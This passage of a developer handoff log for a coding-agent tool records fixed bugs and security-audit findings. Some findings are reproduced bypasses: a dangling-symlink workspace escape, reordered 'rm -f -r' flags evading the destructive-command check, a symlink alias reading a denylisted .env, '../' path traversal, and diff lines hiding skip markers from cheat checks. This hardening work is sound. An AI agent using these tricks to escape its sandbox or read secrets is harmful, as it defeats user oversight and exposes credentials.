   no-paren regex alternative, a whitespace-tolerant self-equality
   pattern, comment-stripping before the threshold check, and a
   `baseStem`-based subject-relatedness check for the snapshot exemption.
5. **Diff-parser content-loss bug** (`diff-parser.ts`) — the file-header
   skip (`line.startsWith("+++") || line.startsWith("---")`) matched any
   line with that prefix, not just the genuine `+++ b/path`/`--- a/path`
   header lines — an added line whose real content starts with `++`
   (renders `+++x; ...`) or a removed line starting with `--` was
   silently dropped before any cheat check ever saw it, letting e.g. a
   skip-marker addition hide inside a line shaped that way. Fixed by
   tracking whether a hunk (`@@ ... @@`) has been seen yet per file —
   header lines only ever appear before the first hunk.
6. **`classifyFailure` lint/typecheck `ENV_ERROR_RE` gap** — `build`/`test`
   both check `ENV_ERROR_RE` before trusting their own stage name (an
   environment failure — `ECONNREFUSED`, disk-full — isn't a task the
   model can fix by editing code); `lint`/`typecheck` skipped that check
   entirely, exactly the misclassification the surrounding comment warns
   against for the other two stages. Fixed by mirroring the check.
7. **Loop-detector key-order blind spot** (`agent-loop.ts` →
   `loop-detector.ts`) — `recordToolCall` was wired with the raw
   `argsJson` *string*, not the parsed object, so `stableStringify`'s
   whole documented purpose (canonicalize by sorted key order, so two
   calls with the same semantic args but differently-ordered JSON hash
   identically) never actually ran — it short-circuits to
   `JSON.stringify` on a non-object. Fixed by parsing `argsJson` before
   handing it to the detector, falling back to the raw string only on a
   parse failure.
8. **Provider stream-failure masking** (`openai-compatible.ts` +
   `anthropic.ts`) — three sub-bugs each, same root cause: a stream that
   ends (connection drop, in-band `{error:...}`/`event: error` with no
   `choices`/prior `stop_reason`) without ever producing a chunk the loop
   recognizes as terminal used to fall through silently, and `collect()`
   defaults `finishReason` to `"stop"` — a truncated or failed turn was
   reported as a normal, complete one. Also: OpenAI's `content_filter`
   and Anthropic's `refusal` finish/stop reasons fell through to `default`
   → `"stop"` instead of `"error"`; Anthropic's in-stream `error` event
   was hardcoded `retryable: false` regardless of the error's actual
   type (`overloaded_error` is Anthropic's own documented transient
   condition, same tier as an HTTP 529). Fixed with a `sawTerminal` flag
   yielding an explicit error if the stream ends without one, explicit
   `content_filter`/`refusal` → `"error"` mappings, and a
   `RETRYABLE_ANTHROPIC_ERROR_TYPES` set driving `retryable` from the
   error's real type.
9. **CLI `NaN` budget bypass** — `(v) => parseInt(v, 10)`/`parseFloat`
   silently produce `NaN` for a typo'd flag value, and the only check
   downstream is `!== undefined` (true for `NaN`) — reproduced for real:
   `clutchcode run ... --max-steps five` genuinely ran with the step
   budget silently set to `NaN` (visible verbatim in the CLI's own status
   output as `steps: 1/NaN`), since every `>=` comparison against `NaN`
   is `false`. Fixed with `parseIntArg`/`parseFloatArg` wrappers that
   throw `InvalidArgumentError` on `NaN`, giving a clean CLI rejection.
10. **CLI `--squash` always-on** — a plain `--squash` boolean defaulting
    to `true` had no `--no-squash` counterpart, so `ApproveOptions.squash
    === false` (a real, different `git merge --no-ff` code path in
    `approveRun`, preserving full checkpoint history) could never
    actually be reached from the CLI — reproduced: `--no-squash` errored
    "unknown option." Fixed by registering `--no-squash` instead (commander
    auto-negates the same underlying boolean).
11. **VS Code `cliPath` workspace-setting hijack** — `clutchcode.cliPath`
    had no `scope` declared (defaulting to `window`, settable from a
    workspace's own `.vscode/settings.json`), so any repo could redirect
    which binary the extension spawns with no prompt. Fixed by declaring
    `"scope": "machine"` — can only be set in User/Remote settings per
    VS Code's own documented contract. **Caveat, stated plainly:** no
    real VS Code extension host exists in this environment, so this can't
    be exercised end-to-end; the new test only proves the schema
    declaration itself is present and hasn't regressed.
12. **Credential-file-store silent data loss** — `fileStoreSet`/
    `fileStoreClear` treated any decrypt/parse failure of an *existing*
    `credentials.age` (rotated machine key, corrupted/truncated file)
    identically to "nothing stored yet," then silently overwrote the
    file with just the one account being touched — reproduced by
    corrupting a two-account store and confirming the corrupted bytes
    used to get clobbered by a fresh single-account envelope. Fixed by
    threading through an `existedButUndecryptable` flag from a new
    `readStoreDetailed` and refusing to write when it's set — `fileStoreGet`'s
    documented always-silent read contract is untouched.
13. **Truncate.ts positional-dedup bug** — `extraFailures` deduped shown
    vs. omitted failure lines by *text*, not position, so a repeated
    error string (very typical in a real CI log) appearing once in the
    shown head and again, genuinely distinctly, deep in the omitted
    middle made the omitted occurrence invisible. Fixed by tracking shown
    line *indices* instead of a text `Set`.
14. **Test-selection basename-only matching** — `selectImpactedTests`
    matched a changed file to a test file by basename alone, no
    directory relationship check, so an unrelated same-named test file
    anywhere else in the repo satisfied "this file was mapped" and
    suppressed the full-suite fallback while the real (different-
    basename) test never ran. Fixed with a `relatedDirs` check (same
    directory, a conventional test subdirectory, or a top-level `src/`+
    `test/`-style sibling split) — deliberately conservative so two
    same-parent module directories with unrelated names don't count.

608 → 653 tests (45 new), clean `tsc -b`, clean `eslint .`. One review
agent (sandbox/policy/redaction/tier1) did not complete — hit a session
API limit — and is genuinely unreviewed this round, not silently skipped.

### Autonomous-continuation convention ("start work" / "refer the handoff and work")

Not a code change — a process convention, requested directly: two trigger
phrases that let a session pick up this project's own continuation loop
without needing the exact task re-explained each time.

- **"start work"** spawns a background `general-purpose` subagent that
  reads `CLAUDE.md` + `HANDOFF.md`, picks the next unit of work, does it
  end to end (tests, the verify-before-fix discipline, build/test/lint,
  HANDOFF.md update, commit/push), and reports back — the orchestrating
  session relays that report to the user rather than fabricating one.
- **"refer the handoff and work"** (typically the first message of a
  fresh session) skips the subagent — the session itself reads
  `HANDOFF.md` + `CLAUDE.md` and starts the same work directly, no
  clarifying questions.

Implemented as two project skills (`.claude/skills/start-work/SKILL.md`,
`.claude/skills/refer-handoff/SKILL.md`) that pattern-match the trigger
phrases and point back at a new `CLAUDE.md` section, "Autonomous
continuation," which is the actual source of truth: it defines the shared
priority order for "what's the next unit of work" (an explicitly deferred
item from this file's latest "what's done" entry first, then the top row
of "What's left" below, then another audit round per the most recent
review round's methodology if neither exists) so both trigger phrases stay
in lockstep with each other and can't drift apart. Kept the actual
playbook in one place (`CLAUDE.md`) rather than duplicated across both
skill files, for the same "one shared thing, not two that can drift"
reason as this session's `assertSafeRunId` fix.

### Sandbox/policy/redaction security audit (§12/§5.2) — the round-3 subagent that hit a session limit, completed

Picked up per the autonomous-continuation priority order above: the
round-3 review's 9th subagent (sandbox/policy/redaction) never finished —
genuinely unreviewed, flagged "do first" in "what's left," not silently
skipped. Reviewed every file in that scope directly: `policy.ts`,
`denylist.ts`, `destructive.ts`, `env.ts`, `redactor.ts`, `tier1-linux.ts`,
`tier1-macos.ts`, `seccomp-linux.ts` (beyond the temp-path issue round 3
already fixed), plus the tool-layer callers that consume them
(`read-file.ts`/`write-file.ts`/`edit-file.ts`/`shell.ts`/
`workspace-path.ts`). Before any of that: this session's container had
neither `bubblewrap` nor `secret-tool`/`gnome-keyring` installed (a fresh
container, not the same one prior sessions configured) — 9 tests were
failing for that reason alone. Reinstalled both (`apt-get install
bubblewrap libsecret-tools gnome-keyring dbus-x11`) so the baseline is
genuinely verified against the real backends again, not skipped/mocked,
before starting the audit. Also cross-checked the full x86_64 seccomp
syscall table (`DENIED_SYSCALLS_X86_64`, all 22 entries) against this
host's own authoritative kernel header
(`/usr/include/x86_64-linux-gnu/asm/unistd_64.h`) — the existing real-bwrap
tests only empirically exercise 4 of the 22 syscalls; all 22 numbers match,
and the BPF jump-offset arithmetic was hand-traced for both boundary
indices (first/last denied syscall) and checks out. No bug there.

Three real findings, each reproduced for real before fixing and proven
with a test that fails against the pre-fix code and passes after (`git
stash push -- <file>`, confirm the new test fails, `git stash pop`,
confirm it passes):

1. **Follow-up gap in the round-2 `resolveInWorkspace` symlink fix** —
   that fix walked up to the deepest *existing* ancestor using
   `fs.existsSync`, which *follows* a symlink to decide existence. A
   **dangling** symlink (its target doesn't exist yet) therefore reported
   `existsSync === false` for its own path — indistinguishable, to that
   check, from an ordinary not-yet-created file — so the walk skipped
   straight past the symlink itself and re-appended it *unresolved* onto
   whatever ancestor existed above it. Reproduced for real: a dangling
   symlink `workspace/link -> /tmp/outside/pwned.txt` (the target
   directory exists, the target file does not) made `resolveInWorkspace`
   report `inside: true`, and `fs.writeFileSync(abs, ...)` — where `abs`
   is still the unresolved `workspace/link` — genuinely created
   `/tmp/outside/pwned.txt`, following the symlink exactly the way a real
   POSIX `open(..., O_CREAT)` does for a broken symlink whose parent
   directory exists. Fixed by replacing the single end-of-walk
   `realpathSync` call with a per-component resolver
   (`resolveRealAsFarAsPossible`) that walks via `fs.lstatSync` (reports a
   symlink's own existence without dereferencing it) and follows each
   symlink hop — including a dangling one — via `fs.readlinkSync`, only
   stopping at a component that doesn't exist *at all*. Six new tests
   across `workspace-path.test.ts` (the dangling-outside case, a dangling-
   but-inside control, a multi-hop chain with a dangling link mid-chain)
   and `read-write-edit.test.ts` (the same exploit through the real
   `write_file` tool).
2. **`isDestructiveCommand`'s `rm` detection bypassable by flag order or
   short/long-form mixing.** The pattern list was a fixed set of regex
   alternatives (`-rf`, `-fr`, `--recursive .. --force`, `--force ..
   --recursive`, bare short `-r`) — reproduced for real that `rm -f -r x`,
   `rm --force -r x`, `rm -f --recursive x`, and `rm --recursive x` (alone)
   are all functionally identical to already-flagged spellings per
   POSIX/GNU option parsing (order and short/long form don't change
   semantics) but matched none of the alternatives. This is directly
   reachable, not adversarial — an LLM has no reason to prefer the exact
   spellings the regex list happened to enumerate. Fixed by replacing the
   `rm`-specific regexes with `isDestructiveRm`: tokenizes each `rm`
   invocation's own argument list (segmented from any other command in a
   `;`/`&&`/`||`/`|`/newline-separated pipeline, so flags on one command
   never bleed into another) and checks for recursion independent of
   order or form — closing the whole reordering/mixing class at once
   instead of enumerating more concrete spellings. Six new tests in
   `destructive.test.ts`.
3. **§5.3 secrets denylist bypassable via a same-workspace symlink
   alias.** `Denylist.isDenied` does pure basename/suffix matching, and
   every call site (`read_file`, `write_file`, `edit_file`) checked it
   against `abs` — the *requested*, unresolved path — never the real
   target. A symlink entirely *inside* the workspace aliasing a
   denylisted file under an innocuous name (`notenv.txt -> .env`, both
   inside the workspace — `inside` was already correctly `true`, this is
   not the escape bug above) sailed straight past the denylist on both
   read and write. Reproduced for real: `read_file({path:
   "notenv.txt"})` returned the live `.env`'s content verbatim, and
   `write_file` through the same alias would have overwritten it. Fixed
   by having `resolveInWorkspace` also return `real` (the fully
   symlink-resolved target — the same value already computed internally
   for the containment check, just not previously exposed) and switching
   all three call sites to denylist-check `real` instead of `abs`. Four
   new tests (one at the `workspace-path.ts` unit level, two at the
   tool level for read and write, one asserting the original file's
   content survives the blocked write attempt).

664 tests total (up from 653; 11 new), clean `tsc -b`, clean `eslint .`.
This closes the "do first" row in "what's left" below — the sandbox/
policy/redaction subsystem now has a complete review pass, not a partial
one.

### Git worktree/dirty-tree correctness findings (§13.1/§13.3) — the five round-3-deferred fixes

Picked up per the autonomous-continuation priority order: nothing was
deferred in the prior session's own "what's done" entry, so this is the
row tagged "do first" in "what's left" (the table's literal top-to-bottom
order hadn't been re-sorted after the sandbox/policy/redaction row above
was completed and removed — treated the explicit "do first" tag as the
actual priority signal, consistent with how the *previous* session picked
its own "do first"-tagged row over the table's literal position). All five
confirmed-real findings from round 3's git-package audit, each reproduced
for real before fixing and proven with the full `git stash push -- <file>`
/ confirm-new-test-fails / `git stash pop` / confirm-passes cycle:

1. **`checkpoint()`'s post-`add -A` status check swallowed real git
   errors as "nothing to commit."** `git status --porcelain` genuinely
   exits 0 for a clean tree — it only exits non-zero for an actual
   failure (index lock, disk error, corruption) — so the existing
   `allowFailure: true` on that call meant a real error and a clean tree
   were indistinguishable to `checkpoint()`, silently skipping a
   checkpoint that should have existed right after `add -A` staged real
   content. Reproduced without mocking `checkpoint()` itself: a thin PATH
   shim intercepts exactly `git status --porcelain` (every other
   invocation, including the preceding `add -A`, still goes to the real
   binary) and fails it with a simulated "index file smaller than
   expected"-style error; pre-fix, `checkpoint()` returned `null` as if
   nothing changed, post-fix it throws. Fixed by removing `allowFailure`
   from that one call.
2. **`approveRun`/`discardRun` let a `restoreStash` failure read as "the
   whole operation failed," even after the merge/discard had already
   genuinely completed.** Reproduced for real: a user's local edit to a
   file gets auto-stashed, the run edits the *same* file differently and
   gets merged in cleanly (no merge conflict — the stash means
   `repoPath`'s copy is clean at merge time), then restoring the stash
   conflicts with the merge's own result — confirmed directly with a
   throwaway repo that a failed `git stash pop` leaves literal conflict
   markers in the file and, per git's own documented behavior ("The stash
   entry is kept in case you need it again"), never drops the stash
   either. Pre-fix, that pop's `GitError` propagated straight out of
   `approveRun` with no indication the merge itself had already succeeded.
   Fixed by catching just that failure and returning it as an optional
   `stashRestoreWarning` on `approveRun`'s/`discardRun`'s result instead of
   throwing — `mergedSha` is still returned normally either way.
3. **The auto-stash was identified by a positional `stash@{0}`, captured
   once at push time and reused verbatim at restore time.** A plausible
   manual `git stash` elsewhere on the same repo during a long-running run
   shifts every existing entry's position, so a later `restoreStash` could
   pop the wrong one. Reproduced directly: push the auto-stash, then push
   a second, unrelated manual stash (moving the auto-stash from position 0
   to 1); pre-fix, `discardRun` popped the *manual* stash's content instead
   of the auto-stash's, leaving the real auto-stash orphaned in the stash
   list forever. Fixed by capturing the stash's own commit SHA
   (`git rev-parse stash@{0}`, resolved right after the push) instead of a
   positional name, and resolving that SHA back to whatever position it
   currently occupies (`git stash list --format=%H`) at restore time.
4. **Neither dirty-tree strategy actually preserved the original
   staged/unstaged split**, despite a code comment on the temp-commit path
   claiming the tree was "left exactly as it was." For the stash strategy,
   reproduced with a fully-staged modification to a tracked file: plain
   `git stash pop` collapses it to unstaged (` M`) on restore, losing the
   staged bit entirely — confirmed empirically that git's own `--index`
   flag exists precisely to prevent this and does; fixed by adding
   `--index` to the pop. For the temp-commit strategy, `git add -A`
   unavoidably stages everything to capture untracked files in the temp
   commit, and `reset --soft HEAD~1` only moves HEAD back — it doesn't
   restore the index's prior split, so every file ended up staged
   afterward regardless of its original state. Fixed with a precise
   fix rather than a partial one: capture the index as a tree object via
   `git write-tree` *before* touching anything, then restore it verbatim
   via `git read-tree` afterward — both operate purely on the index, never
   the working tree, so this reproduces the original split exactly, proven
   with a file that was genuinely *partially* staged (some hunks staged,
   some not — the case `git stash --index` itself can't always get
   perfectly right, confirmed by direct comparison in a throwaway repo).
5. **`createRunWorktree` ran the destructive dirty-tree handling (stash/
   temp-commit) before the still-fallible `git worktree add`,** with no
   recovery path if anything after it failed — the `RunWorktree` object
   that would have carried `dirtyTreeResult.stashRef` back to a caller is
   only ever constructed on the success path. Reproduced with a real,
   plausible failure (a leftover branch from an earlier run reusing the
   same runId/slug, so `git worktree add -b <branch>` collides): pre-fix,
   the function just threw, leaving the user's auto-stashed changes
   invisible to anything downstream. Fixed by wrapping the post-
   `handleDirtyTree` logic in try/catch and auto-restoring the stash on
   failure (temp-commit needs no recovery — its own `reset --soft` +
   index-restore already leaves the working tree untouched), narrating the
   outcome either way (restored automatically, or — if even that
   fails — exactly which stash to recover by hand) in the thrown error so
   nothing is silently orphaned.

670 tests total (up from 664; 6 new — one per finding), clean `tsc -b`,
clean `eslint .`. This closes the "Git worktree/dirty-tree correctness
findings" row in "what's left" below; the `snapshot-backup.ts` `relPath`
traversal row (also round-3-deferred, currently unreachable dead code) is
untouched and still open.

### `snapshot-backup.ts` `relPath` path traversal (§13.4) — the last round-3-deferred finding, closed

Picked up per the autonomous-continuation priority order: the prior
session's own "what's done" entry explicitly flagged this row as still
open, and it also carries the "do first" tag in "what's left" — both
signals point at the same row, so no ambiguity this time.

`SnapshotBackup.snapshotBeforeFirstEdit` (the §13.4 non-git fallback: a
snapshot-vs-current backup used when there's no git worktree to isolate a
run) joins a caller-supplied `relPath` into two different roots —
`workspaceRoot` (to read the file's current content) and `backupDir` (to
store the backup) — via a bare `path.join`, with no traversal guard at
all. Reproduced for real before writing any fix, against a throwaway
workspace with deliberately distinct-depth roots (so the two escape
directions can't collide on the same absolute path and mask each other —
an early repro attempt with same-depth sibling roots did exactly that, the
"backup" and "victim" paths turned out identical and the escape was
invisible until the roots were re-nested at different depths): a `relPath`
built as `path.relative(workspaceRoot, someFileOutsideIt)` (e.g.
`"../canary.txt"`) made `snapshotBeforeFirstEdit` write its backup file
*outside* `backupDir` entirely — confirmed on disk, not just structurally —
and a later `rollback()` for the same `relPath` genuinely overwrote a file
*outside* `workspaceRoot` with backed-up content. Same class of bug as the
`runId` path traversal fixed in an earlier round (`run-id.ts`'s
`assertSafeRunId`), but `relPath` legitimately needs to carry subdirectory
structure (`"src/nested/file.ts"`), so the single-segment allow-list shape
`SAFE_RUN_ID_RE` uses isn't the right fit here.

Fixed with a new `@clutchcode/git` module, `rel-path.ts`:
`isSafeRelPath`/`assertSafeRelPath` reject the specific traversal
primitive itself (any `..` path segment, split on both `/` and `\`
regardless of the current platform's own separator, since `relPath` is
untrusted text that may assume a different convention than this process's
`path.sep`) plus absolute and Windows-drive/UNC-shaped input, and a
companion `assertContainedIn(root, resolved)` re-checks the actual joined
destination against its root as defense in depth — mirroring the
"structural allow-list plus a `path`-based containment re-check on the
resolved result" pattern already established for `runId`. `
snapshotBeforeFirstEdit` calls `assertSafeRelPath` first, then
`assertContainedIn` against both `src` and `dest` before touching disk or
recording the path as snapshotted — since it's the *only* entry point that
ever adds to `SnapshotBackup`'s internal `snapshotted` set (`diff()`/
`rollback()` only ever iterate that already-validated set, never take a
fresh `relPath`), this one chokepoint is genuinely sufficient, unlike
`runId` which needed the same validator wired into several independent
read/mutate paths.

Confirmed real and fixed, not just plausible: reverted `snapshot-backup.ts`
alone via `git stash push -- packages/git/src/snapshot-backup.ts`, re-ran
the new tests — all 5 traversal-specific tests failed against the pre-fix
code (the other 5 pre-existing/legitimate-path tests in the same file kept
passing, confirming the fix doesn't regress ordinary nested-path use), then
`git stash pop` and re-ran — all passed again. 17 new tests: 11 in a new
`rel-path.test.ts` (accepts ordinary and nested paths; rejects a leading,
buried, and bare `..`; rejects POSIX-absolute and Windows-drive/UNC-shaped
input even on POSIX; rejects a backslash-separated `..` even though POSIX
`path` itself wouldn't split on it; rejects empty string and embedded NUL;
`assertContainedIn`'s own accept/reject/string-prefix-vs-real-containment
cases) and 6 in `snapshot-backup.test.ts` (a legitimate nested-subdirectory
path still round-trips through snapshot+rollback; three direct rejection
cases; two full reproductions of the original disk-level escape, now
asserted to throw before any file gets written in either direction). 687
tests total (up from 670; 17 new), clean `tsc -b`, clean `eslint .`. This
closes the row in "what's left" — round 3's git-package audit (worktree/
dirty-tree correctness, prior entry, plus this one) is now fully resolved,
with nothing left deferred from that round.

### Windows sandbox Tier 1 (§12.5/§12.6, A11/Q5) — closed as a documented decision: doc-only, WSL2-recommended

Picked up per the autonomous-continuation priority order: nothing was left
deferred in the prior session's own "what's done" entry, so this was the
"do first"-tagged top row of "What's left." The row's own note flagged it
needed a decision first — native restricted-token/AppContainer vs. staying
WSL2-doc-only — before it could even be scoped as build-or-skip.

Read what `PROJECT_SPEC.md` itself already says, rather than treating the
row as blocked pending a fresh human call: §12.5's isolation-mechanism
comparison table rates the "Windows restricted token / AppContainer" row
**[C:Low]** — "weakest story; WSL2 preferred" — and §12.6's tiered-defaults
block spells out the fallback explicitly: `Windows→ WSL2 (recommended)
else restricted-token + ASK-heavy policy [C:Low]`. §29's self-review
(point 3) goes further and makes the call directly for a small team: "If
the team is <2, Phase 1 must shed the probe (defer to Phase 2) and Windows
sandbox (doc-only)." A11/Q5 (the assumptions/open-questions registers)
frame this as "decide Windows support level... doc-only vs code," with
Q5's own decision deadline set at "Phase 3" — several phases behind where
this project actually stands now. Taken together, this isn't spec silence
needing a fresh human call — it's the spec having already made the call,
with the low-confidence tag as its own stated reason, and simply never
having that call formally closed out in the registers built to record
exactly it.

Before writing anything, checked whether the runtime already matches this
decision or would need code changes to align with it. It already does,
and is already tested: `detectSandboxBackend()` (`packages/sandbox/src/
tier1.ts`) has no Windows-specific branch at all — any platform besides
`linux`/`darwin` (including `win32`) falls through to `backend: "none"`
with a `reason` string that explicitly names WSL2 as the recommended
path; `tier1.test.ts` already asserts that string contains both `"win32"`
and `"WSL2"`; and `agent doctor`'s `sandbox (§12.5/§12.6)` check
(`apps/cli/src/commands.ts`) surfaces that same `reason` verbatim to the
user, not a generic "unsupported." So the actual gap wasn't missing
behavior — it was that HANDOFF's "What's left" table and README's Status
section both described this as an *open* item ("confirm whether it's
worth building," "remains open too"), reading as unresolved work still
pending, when the spec, the code, and its tests already agree on the
answer.

Closed it as a documented decision rather than a build task:
1. `PROJECT_SPEC.md`'s A11 and Q5 registers marked resolved in place —
   doc-only, WSL2-recommended, pointing at §12.5's `[C:Low]` rating and
   §29's self-review call as the reasoning — rather than silently leaving
   two "decision needed" rows sitting unanswered forever in what the doc
   calls its "authoritative Phase-0 deliverable."
2. `README.md`'s Status section reworded from "remains open too" to state
   the resolved decision plainly, with the same reasoning and a pointer to
   the already-passing test that proves the runtime's `win32` fallback
   message actually names WSL2.
3. This entry, plus removing the row from "What's left" below with the
   "do first" tag moved to the next genuinely unblocked row (see there for
   which, and why).

No code or test changes were needed — the runtime and its test coverage
already matched the decision; the gap was purely a "what's left"/README
bookkeeping one. `PROJECT_SPEC.md`, `README.md`, and `HANDOFF.md` now all
agree the decision is made and closed, not to be revisited without new
information (e.g. concrete user demand for a native Windows sandbox
despite its own spec-rated weakness). Full suite still 687/687 passing,
clean `tsc -b`, clean `eslint .` — nothing here touched runtime behavior.

### Research pass: DeepSeek Harness evaluated — two blocked rows unblocked, one policy gap closed

Not a code change. Prompted directly by the user ("would deepseek harness help
our clutchcode in any way?"), evaluated for real rather than from memory:
cloned `deepseek-ai/deepseek-harness` @ `b150a55` (2026-08-21, MIT, TypeScript,
~2,734 src files across 55 workspace packages — the closest peer to this
project found so far: same language, same package manager, same test runner,
same problem), read its architecture/sandbox/ACP/compaction subsystems and its
published postmortems, and verified every load-bearing claim against a primary
source rather than its README (npm registry for package existence and version,
its own `LICENSE` files for the license split, `git rev-parse` for the pin).

**The honest headline: it does not change our architecture, and almost none of
it is adoptable.** Under our own §2 default the harness itself is
**STUDY-ONLY** like every other reference project, and its plugin/DI core
(Cordis) is explicitly *not* something to adopt — we chose direct package
boundaries (§20) and retrofitting a DI container would be a rewrite, not an
improvement. What it does deliver is three specific, concrete things:

1. **The Landlock blocker is retired.** That row has carried the same stated
   objection for several rounds — a native helper or vetted syscall binding
   "neither exists yet, and a hand-rolled one carries a worse failure mode
   (silently over-permissive, not fail-loud)." `@deepseek-ai/node-addon-landlock-run`
   is exactly that helper, is **BSD-3-Clause** (its own LICENSE, separate from
   the harness's MIT — a distinction that changes the verdict, so it is
   recorded separately in every provenance doc), is published on npm (`0.1.1`,
   confirmed live against the registry), and is **fail-closed by
   construction**, which is precisely the property the objection demanded.
   It also ships a prebuilt `linux-arm64`, so Landlock-on-arm64 does *not*
   inherit the blocker that stalls arm64 seccomp. Row rewritten with a
   four-step executable plan.
2. **ACP is actionable and was already promised.** `PROJECT_SPEC.md` names ACP
   in §18.1, §20 and §26 — our stdio binding is "deliberately the same shape as
   ACP" and §26's risk mitigation is to be "a client of these protocols rather
   than fighting them" — but we never implemented it, so no ACP client can
   actually talk to us. There is now an official SDK (`@agentclientprotocol/sdk`
   `0.25.1`) and a working reference consumer to study. As an **open protocol**
   this lands on the MCP verdict (**REUSE — protocol impl**), not clean-room.
   New row added, scoped as a second binding *alongside* `agent-rpc` so the VS
   Code extension is untouched.
3. **A real policy gap in our own docs, found by trying to answer the
   question.** `LICENSE_AND_REUSE_ANALYSIS.md` governs *source entering our
   tree* and says nearly everything is STUDY-ONLY "even when the license is
   permissive." It had **nothing to say about adding a dependency** — a
   different act with a different risk profile, and one we already do
   routinely (`ajv`, `commander`, `vitest`). Read literally, the doc would have
   forbidden consuming the Landlock helper for reasons that only apply to
   copying. New **§2a, "Depending on a package is not reusing its source"**:
   a comparison table (provenance, attribution, audit story, upstream fixes,
   coupling), the explicit statement that §2's default is a rule about
   *expression* not a preference for hand-rolling, the `ajv` precedent, and
   five binding conditions on the Landlock dependency specifically
   (depend-never-vendor; behind our own seam; fail-closed must be tested by us,
   not trusted; BSD-3-Clause attribution at manifest level; pinned because
   upstream advertises breaking changes).

Also captured: their published **postmortem 0004** documents a Landlock defect
we would very likely have shipped ourselves — a bare `'landlock-run: '`
substring match conflating a *benign* partial-ABI notice with a *fatal* launcher
error, so ripgrep's exit-1-for-no-matches surfaced as `SANDBOX_UNAVAILABLE`.
Our own `classifyFailure` has been bitten twice by that same over-broad-text-match
shape (the bare `"no such file or directory"` case, and the lint/typecheck
`ENV_ERROR_RE` gap), so the lesson — *status-gated* classification, never a
substring bag — is written into the Landlock row as a required step, not a
footnote. A fourth, lower-priority row (tool-result pruning as a distinct
compaction stage, §4.5) was added from their `compaction-tool-result-pruner`.

The Windows Tier 1 decision closed earlier on this branch is **explicitly not
reopened**: their native Windows rung self-reports `partial` enforcement, and
their design note rejects AppContainer for being unable to do arbitrary-path
reads at all — both of which *corroborate* §12.5's `[C:Low]` rating rather than
contradicting it. Recorded as a watch item with two named revisit conditions so
a future session doesn't relitigate it from the same evidence.

Docs touched: new `research/repos/deepseek-harness.md` (full note in
`00_METHOD.md §5`'s standard schema), `research/00_METHOD.md` inventory row
(with a footnote on the later clone date and the license split),
`LICENSE_AND_REUSE_ANALYSIS.md` (three table rows + new §2a; also corrected the
stale "the one genuine REUSE" line, which is now two — MCP and ACP),
`docs/PRIOR_ART.md` (four rows + corrected the blanket "all of the above are
STUDY-ONLY" claim), and this file. No code, no tests, no behavior change:
687/687 still passing, clean `tsc -b`, clean `eslint .`.

### Research pass: pi agent harness evaluated — a real latent provider gap, and a correction

Prompted by a second repo link with "now something useful from this."
Cloned `Derric01/pi_coding_agent` @ `f13e6a8` **after confirming the clone
matched the live remote HEAD** (`git ls-remote` — the user asked explicitly for
this, and it did match; single `main` branch).

**A correction worth recording, because it changed the whole verdict.** The
repo sits under a familiar owner name, and the first read of the situation was
"this is first-party work, so the clean-room rules don't bind." That was wrong:
`LICENSE` is **MIT © 2025 Mario Zechner** (the upstream pi harness, <https://pi.dev>,
published as `@earendil-works/*`) and this is a **fork**. The ordinary §2
STUDY-ONLY default therefore applies in full, exactly as for Aider or opencode.
Caught by reading the `LICENSE` file rather than trusting the repo's owner
prefix — worth generalizing: **a repo under a known owner is not evidence of
that owner's copyright**, and the LICENSE is the only thing that settles it.

**Cross-signal from the previous entry:** DeepSeek Harness's capability-seams
graph lists an `llm-pi-ai` package — i.e. it depends on this same
`@earendil-works/pi-ai`. Two independently-built serious harnesses converging on
one provider library says more about that library than either project alone.

**The concrete finding — real, latent, correctly scoped as not-yet-reachable.**
`pi-ai`'s stop/finish-reason vocabulary is materially wider than ours; the
interesting entry is Anthropic's **`pause_turn`**. Verified against Anthropic's
own published API documentation (not from memory, and not from pi-ai's
treatment of it): `pause_turn` means *the model paused a long-running turn and
the client is expected to resume it* — it arises with server-side tools
(web search / web fetch / code execution). Our `mapStopReason` in
`packages/providers/src/anthropic.ts` has no `pause_turn` case, so it falls
through `default:` to `"stop"` — the agent loop would treat a *paused* turn as
a *completed* one. That is precisely the defect signature round 3 found six
instances of ("a truncated or failed turn reported as a normal, complete one").

**Scoping it honestly, per "a finding can be real and mis-scoped at the same
time":**
- It is **not currently reachable**. `pause_turn` only occurs when the request
  declares Anthropic server tools; we declare none (grepped — no `web_search`,
  `web_fetch`, `code_execution`, or `server_tool` anywhere in `packages/providers`
  or `packages/tools`). Our tools are all client-side. Same category as the
  `snapshot-backup.ts` `relPath` row: confirmed real, currently dead, worth
  closing *before* the wiring exists rather than after.
- **pi-ai maps it to `"stop"` too** — deliberately, as a named case with the
  comment "Stop is good enough -> resubmit." So this is *not* "they got it right
  and we got it wrong." The difference is that theirs is an explicit, documented
  decision inside a loop that resubmits, while ours is an unnamed fallthrough in
  a loop that treats `"stop"` as terminal.
- Closing it properly is **not a one-liner**: `FinishReason` is
  `"stop" | "tool_use" | "length" | "error"` with no paused variant, so doing it
  right means adding one and deciding what `AgentLoop` does with it. That is a
  small design decision, deliberately left queued rather than made unilaterally.

Two rows added to "What's left" (the `pause_turn`/conformance row, and a
generated-model-catalog row that complements — does not replace — the §4.9
capability probe). Recorded explicitly as **not** worth doing: adopting `pi-ai`
as our provider layer. Its coverage and error vocabulary are better than ours,
but it pulls `@aws-sdk/client-bedrock-runtime`, `@google/genai`,
`@mistralai/mistralai`, `openai`, `@anthropic-ai/sdk`, `undici`, `proxy-agent`
and more into a local-first tool (§17) that hand-assembled a seccomp BPF filter
in TypeScript specifically to avoid *one* runtime dependency (§12.6). §2a's
"depend, don't copy" reasoning cuts both ways: the `ajv` precedent was ~4 small
transitive deps, not three cloud-vendor SDKs.

Docs touched: new `research/repos/pi-agent-harness.md`, plus inventory/licence/
prior-art rows in `research/00_METHOD.md`, `LICENSE_AND_REUSE_ANALYSIS.md`,
`docs/PRIOR_ART.md`, and this file. No code, no tests, no behavior change:
687/687 still passing, clean `tsc -b`, clean `eslint .`.

---

## What's left

Ordered by what a next session should reach for first — **this ordering is
the priority signal**, so a row added later belongs at its right position,
not appended to the bottom. Exactly **one** row carries a `DO FIRST` tag at
any time (currently the top row); when that row is completed, move the tag
to whatever becomes the next genuinely-unblocked, highest-value row rather
than letting it disappear. Do not introduce competing "do first"/"do next"
variants — one tag, one row.
Effort is rough — a single focused session's worth of work, at this
project's standard (real tests, honest verification flags), not a
loose "MVP" estimate.

| Item | Spec ref | Rough effort | Notes |
|---|---|---|---|
